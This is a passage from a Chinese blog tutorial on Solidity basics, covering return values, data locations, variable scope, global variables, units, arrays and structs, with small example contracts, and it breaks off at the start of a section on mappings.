class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，我们利用 <code>returns</code> 关键字声明了有多个返回值的 <code>returnMultiple()</code> 函数，然后我们在函数主体中使用 <code>return(1, true, [uint256(1),2,5])</code> 确定了返回值。</p><p>这里<code>uint256[3]</code>声明了一个长度为<code>3</code>且类型为<code>uint256</code>的数组作为返回值。<strong>因为<code>[1,2,3]</code>会默认为<code>uint8(3)</code>，因此<code>[uint256(1),2,5]</code>中首个元素必须强转<code>uint256</code>来声明该数组内的元素皆为此类型</strong>。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123234741062.png" alt="image-20250123234741062"></p><h4 id="命名式返回">命名式返回</h4><p>可以在 <code>returns</code> 中标明返回变量的名称。Solidity 会初始化这些变量，并且自动返回这些函数的值，无需使用 <code>return</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">    _number = 2;</span><br><span class="line">    _bool = false;</span><br><span class="line">    _array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，我们用 <code>returns(uint256 _number, bool _bool, uint256[3] memory _array)</code> 声明了返回变量类型以及变量名。这样，在主体中只需为变量 <code>_number</code>、<code>_bool</code>和<code>_array</code> 赋值，即可<strong>自动返回</strong>。</p><p>也可以在命名式返回中用 <code>return</code> 来返回变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 命名式返回，依然支持return</span><br><span class="line">function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解构式复制">解构式复制</h4><p>Solidity 支持使用解构式赋值规则来读取函数的全部或部分返回值。</p><ul><li>读取所有返回值：声明变量，然后将要赋值的变量用<code>,</code>隔开，按顺序排列。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint256 _number;</span><br><span class="line">bool _bool;</span><br><span class="line">uint256[3] memory _array;</span><br><span class="line">(_number, _bool, _array) = returnNamed();</span><br></pre></td></tr></table></figure><ul><li>读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。在下面的代码中，我们只读取<code>_bool</code>，而不读取返回的<code>_number</code>和<code>_array</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(, _bool2, ) = returnNamed();</span><br></pre></td></tr></table></figure><h2 id="变量数据存储和作用域">变量数据存储和作用域</h2><p>测试代码<code>DataStorage.sol</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract DataStorage &#123;</span><br><span class="line">    // The data location of x is storage.</span><br><span class="line">    // This is the only place where the</span><br><span class="line">    // data location can be omitted.</span><br><span class="line">    uint[] public x = [1,2,3];</span><br><span class="line"></span><br><span class="line">    function fStorage() public&#123;</span><br><span class="line">        //声明一个storage的变量xStorage，指向x。修改xStorage也会影响x</span><br><span class="line">        uint[] storage xStorage = x;</span><br><span class="line">        xStorage[0] = 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fMemory() public view&#123;</span><br><span class="line">        //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x</span><br><span class="line">        uint[] memory xMemory = x;</span><br><span class="line">        xMemory[0] = 100;</span><br><span class="line">        xMemory[1] = 200;</span><br><span class="line">        uint[] memory xMemory2 = x;</span><br><span class="line">        xMemory2[0] = 300;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">        //参数为calldata数组，不能被修改</span><br><span class="line">        // _x[0] = 0 //这样修改会报错</span><br><span class="line">        return(_x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码<code>Variables.sol</code>，如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Variables &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">    uint public y;</span><br><span class="line">    string public z;</span><br><span class="line"></span><br><span class="line">    function foo() external&#123;</span><br><span class="line">        // 可以在函数里更改状态变量的值</span><br><span class="line">        x = 5;</span><br><span class="line">        y = 2;</span><br><span class="line">        z = &quot;0xAA&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() external pure returns(uint)&#123;</span><br><span class="line">        uint xx = 1;</span><br><span class="line">        uint yy = 3;</span><br><span class="line">        uint zz = xx + yy;</span><br><span class="line">        return(zz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function global() external view returns(address, uint, bytes memory)&#123;</span><br><span class="line">        address sender = msg.sender;</span><br><span class="line">        uint blockNum = block.number;</span><br><span class="line">        bytes memory data = msg.data;</span><br><span class="line">        return(sender, blockNum, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function weiUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 wei == 1e0);</span><br><span class="line">        assert(1 wei == 1);</span><br><span class="line">        return 1 wei;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gweiUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 gwei == 1e9);</span><br><span class="line">        assert(1 gwei == 1000000000);</span><br><span class="line">        return 1 gwei;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function etherUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 ether == 1e18);</span><br><span class="line">        assert(1 ether == 1000000000000000000);</span><br><span class="line">        return 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function secondsUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 seconds == 1);</span><br><span class="line">        return 1 seconds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function minutesUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 minutes == 60);</span><br><span class="line">        assert(1 minutes == 60 seconds);</span><br><span class="line">        return 1 minutes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hoursUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 hours == 3600);</span><br><span class="line">        assert(1 hours == 60 minutes);</span><br><span class="line">        return 1 hours;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function daysUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 days == 86400);</span><br><span class="line">        assert(1 days == 24 hours);</span><br><span class="line">        return 1 days;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function weeksUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 weeks == 604800);</span><br><span class="line">        assert(1 weeks == 7 days);</span><br><span class="line">        return 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Solidity中的引用类型">Solidity中的引用类型</h3><p><strong>引用类型(Reference Type)</strong>：包括数组（<code>array</code>）和结构体（<code>struct</code>），由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。</p><h3 id="数据位置">数据位置</h3><p>Solidity数据存储位置有三类：<code>storage</code>，<code>memory</code>和<code>calldata</code>。不同存储位置的<code>gas</code>成本不同。</p><ul><li><p><code>storage</code>类型的数据存在链上，类似计算机的硬盘，消耗<code>gas</code>多；</p></li><li><p><code>memory</code>和<code>calldata</code>类型的临时存在内存里，消耗<code>gas</code>少。</p></li></ul><p>大致用法：</p><ol><li><code>storage</code>：合约里的状态变量默认都是<code>storage</code>，存储在链上。</li><li><code>memory</code>：函数里的参数和临时变量一般用<code>memory</code>，存储在内存中，不上链。尤其是如果返回数据类型是变长的情况下，必须加memory修饰，例如：string, bytes, array和自定义结构。</li><li><code>calldata</code>：和<code>memory</code>类似，存储在内存中，不上链。与<code>memory</code>的不同点在于<code>calldata</code>变量不能修改（<code>immutable</code>），一般用于函数的参数。</li></ol><p><code>calldata</code>修饰的变量不能被修改，例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">    //参数为calldata数组，不能被修改</span><br><span class="line">    _x[0] = 0; //这样修改会报错</span><br><span class="line">    return(_x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124163637660.png" alt="image-20250124163637660"></p><h4 id="数据位置和赋值规则">数据位置和赋值规则</h4><p>在不同存储类型相互赋值时候，<strong>有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）</strong>。规则如下：</p><ol><li>赋值本质上是创建<strong>引用</strong>指向本体，因此修改本体或者是引用，变化可以被同步。</li></ol><ul><li><code>storage</code>（合约的状态变量）赋值给本地<code>storage</code>（函数里的）时候，会创建引用，改变新变量会影响原变量。样例如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint[] x = [1,2,3]; // 状态变量：数组 x</span><br><span class="line"></span><br><span class="line">function fStorage() public&#123;</span><br><span class="line">    //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x</span><br><span class="line">    uint[] storage xStorage = x;</span><br><span class="line">    xStorage[0] = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署调用一下<code>fStorage</code>函数，然后利用交易的<code>hash</code>对代码进行调试，发现数值被更改。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124165024783.png" alt="image-20250124165024783"></p><ul><li><code>memory</code>赋值给<code>memory</code>，会创建引用，改变新变量会影响原变量。</li></ul><ol start="2"><li>其他情况下，赋值创建的是本体的副本，即对二者之一的修改，并不会同步到另一方。</li></ol><h3 id="变量的作用域">变量的作用域</h3><p><code>Solidity</code>中变量按作用域划分有三种，分别是<strong>状态变量（state variable）</strong>，<strong>局部变量（local variable）<strong>和</strong>全局变量(global variable)</strong></p><h4 id="状态变量（state-variable）">状态变量（state variable）</h4><p>状态变量是数据存储在链上的变量，所有合约内函数都可以访问，<code>gas</code>消耗高。状态变量在合约内、函数外声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Variables &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">    uint public y;</span><br><span class="line">    string public z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在函数里更改状态变量的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo() external&#123;</span><br><span class="line">    // 可以在函数里更改状态变量的值</span><br><span class="line">    x = 5;</span><br><span class="line">    y = 2;</span><br><span class="line">    z = &quot;0xAA&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="局部变量（local-variable）">局部变量（local variable）</h4><p>局部变量是仅在函数执行过程中有效的变量，<strong>函数退出后，变量无效</strong>。局部变量的<strong>数据存储在内存里，不上链，<code>gas</code>低。</strong></p><p>局部变量在函数内声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function bar() external pure returns(uint)&#123;</span><br><span class="line">    uint xx = 1;</span><br><span class="line">    uint yy = 3;</span><br><span class="line">    uint zz = xx + yy;</span><br><span class="line">    return(zz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="全局变量（global-variable）">全局变量（global variable）</h4><p>全局变量是全局范围工作的变量，都是<code>solidity</code>预留关键字。他们可以在函数内不声明直接使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function global() external view returns(address, uint, bytes memory)&#123;</span><br><span class="line">    address sender = msg.sender;</span><br><span class="line">    uint blockNum = block.number;</span><br><span class="line">    bytes memory data = msg.data;</span><br><span class="line">    return(sender, blockNum, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面例子里，我们使用了3个常用的全局变量：<code>msg.sender</code>，<code>block.number</code>和<code>msg.data</code>，他们分别代表请求发起地址，当前区块高度，和请求数据。下面是一些常用的全局变量，更完整的列表请看这个<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">链接</a>：</p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>) 给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。</li><li><code>block.coinbase</code>: (<code>address payable</code>) 当前区块矿工的地址</li><li><code>block.gaslimit</code>: (<code>uint</code>) 当前区块的gaslimit</li><li><code>block.number</code>: (<code>uint</code>) 当前区块的number</li><li><code>block.timestamp</code>: (<code>uint</code>) 当前区块的时间戳，为unix纪元以来的秒</li><li><code>gasleft()</code>: (<code>uint256</code>) 剩余 gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) 完整call data</li><li><code>msg.sender</code>: (<code>address payable</code>) 消息发送者 (当前 caller)</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldata的前四个字节 (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) 当前交易发送的 <code>wei</code> 值</li><li><code>block.blobbasefee</code>: (<code>uint</code>) 当前区块的blob基础费用。这是Cancun升级新增的全局变量。</li><li><code>blobhash(uint index)</code>: (<code>bytes32</code>) 返回跟当前交易关联的第 <code>index</code> 个blob的版本化哈希（第一个字节为版本号，当前为<code>0x01</code>，后面接KZG承诺的SHA256哈希的最后31个字节）。若当前交易不包含blob，则返回空字节。这是Cancun升级新增的全局变量。</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124230136670.png" alt="image-20250124230136670"></p><h4 id="全局变量-以太单位与时间单位">全局变量-以太单位与时间单位</h4><p><strong>以太单位</strong></p><p><code>Solidity</code>中不存在小数点，以<code>0</code>代替为小数点，来确保交易的精确度，并且防止精度的损失，利用以太单位可以避免误算的问题，方便程序员在合约中处理货币交易。</p><ul><li><code>wei</code>: 1</li><li><code>gwei</code>: 1e9 = 1000000000</li><li><code>ether</code>: 1e18 = 1000000000000000000</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124232933314.png" alt="image-20250124232933314"></p><p><strong>时间单位</strong></p><p>可以在合约中规定一个操作必须在一周内完成，或者某个事件在一个月后发生。这样就能让合约的执行可以更加精确，不会因为技术上的误差而影响合约的结果。因此，时间单位在<code>Solidity</code>中是一个重要的概念，有助于提高合约的可读性和可维护性。</p><ul><li><code>seconds</code>: 1</li><li><code>minutes</code>: 60 seconds = 60</li><li><code>hours</code>: 60 minutes = 3600</li><li><code>days</code>: 24 hours = 86400</li><li><code>weeks</code>: 7 days = 604800</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124233108775.png" alt="image-20250124233108775"></p><h2 id="引用类型和映射类型">引用类型和映射类型</h2><h3 id="引用类型">引用类型</h3><p>这一讲，我们将介绍<code>Solidity</code>中的两个重要变量类型：数组（<code>array</code>）和结构体（<code>struct</code>）。</p><h4 id="数组array">数组array</h4><p>数组（<code>Array</code>）是<code>Solidity</code>常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种：</p><ul><li>固定长度数组：在声明时指定数组的长度。用<code>T[k]</code>的格式声明，其中<code>T</code>是元素的类型，<code>k</code>是长度，例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度 Array</span><br><span class="line">uint[8] array1;</span><br><span class="line">bytes1[5] array2;</span><br><span class="line">address[100] array3;</span><br></pre></td></tr></table></figure><ul><li>可变长度数组（动态数组）：在声明时不指定数组的长度。用<code>T[]</code>的格式声明，其中<code>T</code>是元素的类型，例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 可变长度 Array</span><br><span class="line">uint[] array4;</span><br><span class="line">bytes1[] array5;</span><br><span class="line">address[] array6;</span><br><span class="line">bytes array7;</span><br></pre></td></tr></table></figure><p><strong>注意⚠️</strong>：<code>bytes</code>比较特殊，是数组，但是不用加<code>[]</code>。另外，不能用<code>byte[]</code>声明单字节数组，可以使用<code>bytes</code>或<code>bytes1[]</code>。<code>bytes</code> 比 <code>bytes1[]</code> 省gas。</p><h5 id="创建数组的规则">创建数组的规则</h5><p>在Solidity里，创建数组有一些规则：</p><ul><li>对于<code>memory</code>修饰的<code>动态数组</code>，可以用<code>new</code>操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><ul><li><p>数组字面常数(Array Literals)是写作表达式形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如<code>[1,2,3]</code>里面所有的元素都是<code>uint8</code>类型，因为在Solidity中，如果一个值没有指定type的话，会根据上下文推断出元素的类型，默认就是最小单位的type，这里默认最小单位类型是<code>uint8</code>。而<code>[uint(1),2,3]</code>里面的元素都是<code>uint</code>类型，因为第一个元素指定了是<code>uint</code>类型了，里面每一个元素的type都以第一个元素为准。</p><p>下面的例子中，<strong>如果没有对传入 <code>g()</code> 函数的数组进行 <code>uint</code> 转换，是会报错的。</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    function f() public pure &#123;</span><br><span class="line">        g([uint(1), 2, 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    function g(uint[3] memory _data) public pure &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果创建的是动态数组，你需要一个一个元素的赋值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory x = new uint[](3);</span><br><span class="line">x[0] = 1;</span><br><span class="line">x[1] = 3;</span><br><span class="line">x[2] = 4;</span><br></pre></td></tr></table></figure><h5 id="数组成员">数组成员</h5><ul><li><code>length</code>: 数组有一个包含元素数量的<code>length</code>成员，<code>memory</code>数组的长度在创建后是固定的。</li><li><code>push()</code>: <code>动态数组</code>拥有<code>push()</code>成员，可以<strong>在数组最后添加一个<code>0</code>元素，并返回该元素的引用</strong>。</li><li><code>push(x)</code>: <code>动态数组</code>拥有<code>push(x)</code>成员，<strong>可以在数组最后添加一个<code>x</code>元素</strong>。</li><li><code>pop()</code>: <code>动态数组</code>拥有<code>pop()</code>成员，<strong>可以移除数组最后一个元素。</strong></li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124234418473.png" alt="image-20250124234418473"></p><h4 id="结构体struct">结构体struct</h4><p>此时代码<code>StructTypes.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract StructTypes &#123;</span><br><span class="line">    // 结构体 Struct</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        uint256 id;</span><br><span class="line">        uint256 score; </span><br><span class="line">    &#125;</span><br><span class="line">    Student student; // 初始一个student结构体</span><br><span class="line">    //  给结构体赋值</span><br><span class="line">    // 方法1:在函数中创建一个storage的struct引用</span><br><span class="line">    function initStudent1() external&#123;</span><br><span class="line">        Student storage _student = student; // assign a copy of student</span><br><span class="line">        _student.id = 11;</span><br><span class="line">        _student.score = 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 方法2:直接引用状态变量的struct</span><br><span class="line">    function initStudent2() external&#123;</span><br><span class="line">        student.id = 1;</span><br><span class="line">        student.score = 80;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 方法3:构造函数式</span><br><span class="line">    function initStudent3() external &#123;</span><br><span class="line">        student = Student(3, 90);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 方法4:key value</span><br><span class="line">    function initStudent4() external &#123;</span><br><span class="line">        student = Student(&#123;id: 4, score: 60&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Solidity</code>支持通过构造结构体的形式定义新的类型。结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student; // 初始一个student结构体</span><br></pre></td></tr></table></figure><p>给结构体赋值的四种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//  给结构体赋值</span><br><span class="line">// 方法1:在函数中创建一个storage的struct引用</span><br><span class="line">function initStudent1() external&#123;</span><br><span class="line">    Student storage _student = student; // assign a copy of student</span><br><span class="line">    _student.id = 11;</span><br><span class="line">    _student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 方法2:直接引用状态变量的struct</span><br><span class="line">function initStudent2() external&#123;</span><br><span class="line">    student.id = 1;</span><br><span class="line">    student.score = 80;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 方法3:构造函数式</span><br><span class="line">function initStudent3() external &#123;</span><br><span class="line">    student = Student(3, 90);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 方法4:key value</span><br><span class="line">function initStudent4() external &#123;</span><br><span class="line">    student = Student(&#123;id: 4, score: 60&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射类型">映射类型</h3><p>这一讲，我们将介绍映射（<code>Mapping</code>）类型，Solidity中存储键值对的数据结构，可以理解为哈希表。</p><p>测试代码<code>Mapping.sol</code>，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Mapping &#123;</span><br><span class="line">    mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">    mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br><span class="line">    </span><br><span class="line">    // 规则1. _KeyType不能是自定义的 